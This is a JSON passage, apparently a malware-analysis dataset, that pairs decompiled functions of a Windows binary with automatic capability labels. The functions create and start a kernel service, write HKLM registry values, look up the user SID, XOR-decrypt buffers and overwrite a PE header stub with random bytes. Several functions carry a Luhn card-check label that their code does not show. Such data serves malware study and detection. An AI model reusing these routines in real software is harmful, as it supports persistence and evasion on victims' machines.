0x40350a;\n    uVar6 = fcn.004015f0(puVar11[-1], *puVar11, puVar11[1], puVar11[2]);\n    puVar11[6] = uVar6;\n    puVar11[6] = 0xc;\n    puVar11[5] = 0x411684;\n    puVar11[4] = 0x10;\n    puVar11[3] = 0x407014;\n    puVar11[2] = 0x403526;\n    fcn.004015f0(puVar11[3], puVar11[4], puVar11[5], puVar11[6]);\n    puVar11[6] = extraout_ECX;\n    uVar8 = uVar15;\n    bVar17 = false;\n    bVar19 = (extraout_ECX - 1U & uVar8 | 0x61be) == 0;\n    puVar11[6] = 0xb;\n    puVar11[5] = 0x411690;\n    puVar11[4] = 0x10;\n    puVar12 = puVar11 + 3;\n    puVar11[3] = 0x407014;\n    puVar11[2] = 0x403547;\n    uVar9 = fcn.004015f0(puVar11[3], puVar11[4], puVar11[5], puVar11[6]);\n    if ((!bVar19) && (bVar19)) {\n        uVar10 = uVar10 + 1;\n        if (bVar17 || uVar10 == 0) goto code_r0x004035a0;\n        in_AF = 9 < (uVar9 & 0xf) | in_AF;\n        piVar2 = (uVar9 & 0xffff0000 | CONCAT11((uVar9 >> 8) + in_AF, uVar9 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar2 = *piVar2 - uVar10;\n        puVar14 = puVar14 + 1;\n    }\n    puVar11[2] = 4;\n    puVar11[1] = 0x41169c;\n    *puVar11 = 0x10;\n    puVar11[-1] = 0x407014;\n    puVar11[-2] = 0x40356e;\n    fcn.004015f0(puVar11[-1], *puVar11, puVar11[1], puVar11[2]);\n    puVar11[6] = uVar10;\n    *(puVar11 + 0x16) = extraout_DX_00;\n    *(puVar11 + 5) = uVar8;\n    uVar8 = *(puVar11 + 5);\n    uVar10 = puVar11[6];\n    puVar11[6] = 4;\n    puVar11[5] = 0x4116a0;\n    puVar11[4] = 0x10;\n    puVar11[3] = 0x407014;\n    puVar11[2] = 0x403592;\n    uVar7 = fcn.004015f0(puVar11[3], puVar11[4], puVar11[5], puVar11[6]);\n    *(puVar11 + 0x1a) = uVar7;\n    *(puVar11 + 6) = extraout_CX_00;\n    puVar12 = puVar11 + 5;\n    puVar11[5] = uVar15 & 0xffff0000 | uVar8;\ncode_r0x004035a0:\n    puVar12[1] = 0xc;\n    *puVar12 = 0x4116a4;\n    puVar12[-1] = 0x10;\n    puVar12[-2] = 0x407014;\n    puVar12[-3] = 0x4035c2;\n    Var23 = fcn.004015f0(puVar12[-2], puVar12[-1], *puVar12, puVar12[1]);\n    puVar12[1] = Var23;\n    *(puVar12 + 2) = Var23 >> 0x20;\n    puVar12[1] = 4;\n    *puVar12 = 0x4116b0;\n    puVar12[-1] = 0x10;\n    puVar12[-2] = 0x407014;\n    puVar12[-3] = 0x4035df;\n    uVar22 = fcn.004015f0(puVar12[-2], puVar12[-1], *puVar12, puVar12[1]);\n    puVar12[1] = uVar22;\n    *puVar12 = extraout_ECX_00;\n    puVar12[-1] = uVar22 >> 0x20;\n    puVar12[1] = 9;\n    *puVar12 = 0x4116b4;\n    puVar12[-1] = 0x10;\n    puVar12[-2] = 0x407014;\n    puVar12[-3] = 0x40361a;\n    uVar22 = fcn.004015f0(puVar12[-2], puVar12[-1], *puVar12, puVar12[1]);\n    puVar12[1] = uVar22;\n    *puVar12 = uVar22 >> 0x20;\n    puVar12[-1] = puVar14;\n    puVar12[1] = 0x16;\n    *puVar12 = 0x4116c0;\n    puVar12[-1] = 0x10;\n    puVar12[-2] = 0x407014;\n    puVar12[-3] = 0x403644;\n    fcn.004015f0(puVar12[-2], puVar12[-1], *puVar12, puVar12[1]);\n    puVar12[1] = extraout_EDX_02;\n    *(puVar12 + 2) = uVar10;\n    puVar12[1] = 7;\n    *puVar12 = 0x4116d8;\n    puVar12[-1] = 0x10;\n    puVar12[-2] = 0x407014;\n    puVar12[-3] = 0x40367b;\n    fcn.004015f0(puVar12[-2], puVar12[-1], *puVar12, puVar12[1]);\n    return;\n}\n",
        "token_count": 3732
    },
    "00403990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004039f9) overlaps instruction at (ram,0x004039f8)\n// \n\nuint __cdecl fcn.00403990(uint hSCManager, uint lpServiceName)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint8_t extraout_CH;\n    uint8_t *puVar5;\n    uint *unaff_EDI;\n    bool bVar6;\n    ulong uVar7;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    uStack16 = 0xf01ff;\n    uStack20 = lpServiceName;\n    uStack24 = hSCManager;\n    uVar7 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    puVar5 = uVar7 >> 0x20;\n    iVar3 = uVar7;\n    bVar6 = iVar3 == 0;\n    if (bVar6) {\n        return 0;\n    }\n    if ((!bVar6) && (bVar6)) {\n        uVar1 = in(uVar7 >> 0x20);\n        *unaff_EDI = uVar1;\n        if (&uStack24 < 1) {\n            return 0;\n        }\n    }\n    *puVar5 = *puVar5 ^ extraout_CH;\n    iVar4 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar3, 0);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (((iVar4 == 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar4 != 0x420)) &&\n       (iVar4 = (*pcVar2)(),  iVar4 != 0x422)) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar3);\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar3);\n    return 1;\n}\n",
        "token_count": 446
    },
    "00403a50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403a50(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401690(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 53
    },
    "00404130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404157) overlaps instruction at (ram,0x00404155)\n// \n\nuint32_t __cdecl fcn.00404130(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    bool bVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint8_t unaff_BL;\n    bool bVar4;\n    \n    uVar3 = 0;\n    bVar4 = false;\n    uVar2 = arg_14h;\n    if (arg_14h != 0) {\n        do {\n            if ((uVar2 < 0) || (uVar2 >= 0)) {\n                unaff_BL = *(uVar3 + arg_10h);\n            }\n            bVar1 = CARRY4(in_EAX + 0x311c8a2f, bVar4);\n            uVar2 = in_EAX + 0x311c8a2f + bVar4;\n            if ((in_EAX < 0xcee375d1 && !bVar1) && (in_EAX >= 0xcee375d1 || bVar1)) {\n                out(0xbd, uVar2);\n                return uVar2;\n            }\n            unaff_BL = unaff_BL ^ *(uVar3 % arg_ch + arg_8h);\n            *(uVar3 + arg_10h) = unaff_BL;\n            uVar3 = uVar3 + 1;\n            bVar4 = uVar3 < arg_14h;\n            in_EAX = arg_8h;\n            uVar2 = uVar3 - arg_14h;\n        } while (bVar4);\n    }\n    return in_EAX;\n}\n",
        "token_count": 404
    },
    "004043e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00404445)\n\nbool fcn.004043e0(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00401550(0x80000002, 0x411644, 0x411684, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n        return iVar1 != -1;\n    }\n    return false;\n}\n",
        "token_count": 174
    },
    "00404480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004044e5) overlaps instruction at (ram,0x004044e4)\n// \n// WARNING: Removing unreachable block (ram,0x004044e2)\n\nbool fcn.00404480(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    int32_t unaff_EDI;\n    char *pcVar5;\n    bool in_CF;\n    bool in_ZF;\n    uint uStack8;\n    \n    puVar4 = &stack0xfffffffc;\n    uStack8 = 0;\n    if ((in_CF || in_ZF) || (!in_CF && !in_ZF)) {\n        in_EAX = &uStack8;\n    }\n    else {\n        *(unaff_EDI + -0x73) = *(unaff_EDI + -0x73) - &stack0xfffffff0;\n        puVar4 = &stack0xfffffffd;\n    }\n    iVar2 = fcn.00404810(in_EAX);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (*(puVar4 + -4) == 0) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar5 = *(puVar4 + -4);\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x41152c, 0x41156c, 1, *(puVar4 + -4), ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 424
    },
    "004045e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t fcn.004045e0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00404780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004047e3) overlaps instruction at (ram,0x004047e0)\n// \n\nuint __cdecl fcn.00404780(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    bVar2 = false;\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n    if ((bVar2) || (!bVar2)) {\n        (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n    }\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n    return 1;\n}\n",
        "token_count": 190
    },
    "00404810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get user security identifier"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004048b2) overlaps instruction at (ram,0x004048b1)\n// \n// WARNING: Removing unreachable block (ram,0x004048b2)\n\nuint __cdecl fcn.00404810(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *unaff_EDI;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &var_114h, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 != 0) {\n        if ((-1 < iVar1) && (-1 >= iVar1)) {\n            out(0xc4, iVar1);\n            *unaff_EDI = iVar1;\n        }\n        iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&var_114h, arg_8h);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 365
    },
    "004048f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004048f0(uint arg_8h, uint arg_ch)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    fcn.00404e70(hSCManager, arg_8h);\n    uVar1 = fcn.00401830(hSCManager, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 130
    },
    "00404ad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404b02) overlaps instruction at (ram,0x00404b00)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint64_t __cdecl int.00404ad0(int16_t *arg_8h)\n\n{\n    uint in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t in_EDX;\n    uint extraout_EDX;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    bool bVar8;\n    uint64_t uVar9;\n    \n    if (*arg_8h != 0x5a4d) {\n        return in_EDX << 0x20;\n    }\n    if ((0x5a4c < *arg_8h) && (*arg_8h < 0x5a4d)) {\n        return CONCAT44(in_EAX, in_EDX);\n    }\n    if (*(*(arg_8h + 0x1e) + arg_8h) != 0x4550) {\n        return in_EDX << 0x20;\n    }\n    if ((*(arg_8h + 0x1e) + arg_8h)[0x16] != 0) {\n        return in_EDX << 0x20;\n    }\n    if (*(arg_8h + 0x1e) < 0x81) {\n        return in_EDX << 0x20;\n    }\n    uVar4 = 0x40;\n    if (*(arg_8h + 0x1e) < 0xc0) {\n        uVar4 = *(arg_8h + 0x1e) - 0x80;\n    }\n    uVar9 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(uVar4);\n    puVar1 = uVar9;\n    bVar8 = puVar1 == NULL;\n    if (bVar8) {\n        return uVar9 & 0xffffffff00000000;\n    }\n    if ((!bVar8) && (bVar8)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar3 = 0;\n    if (uVar4 != 0) {\n        do {\n            iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n            uVar6 = uVar3 + 1;\n            *(uVar3 + puVar1) = iVar2 % 0xff;\n            uVar3 = uVar6;\n        } while (uVar6 < uVar4);\n    }\n    puVar5 = puVar1;\n    puVar7 = arg_8h + 0x40;\n    for (uVar3 = uVar4 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar7 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar7 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__(puVar1);\n    return CONCAT44(extraout_EDX, 1);\n}\n",
        "token_count": 793
    },
    "00404520": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00404520(void)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    bool bVar3;\n    unkbyte6 Var4;\n    uint var_4h;\n    \n    puVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    bVar3 = puVar2 == NULL;\n    if (bVar3) {\n        return 0;\n    }\n    if ((!bVar3) && (bVar3)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    Var4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    *0x424824 = Var4;\n    if ((!bVar3) && (bVar3)) {\n        out(*puVar2, Var4 >> 0x20);\n    }\n    *0x424828 = (*pcVar1)();\n    *0x42482c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(puVar2, 0x411494);\n    if (((*0x424824 != 0) && (*0x424828 != 0)) && (*0x42482c != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 299
    },
    "00403e20": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403e20(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00403e50": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00403e50(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x41152c, 0x411570, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 79
    },
    "00401830": {
        "rules": [
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401830(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 138
    }
}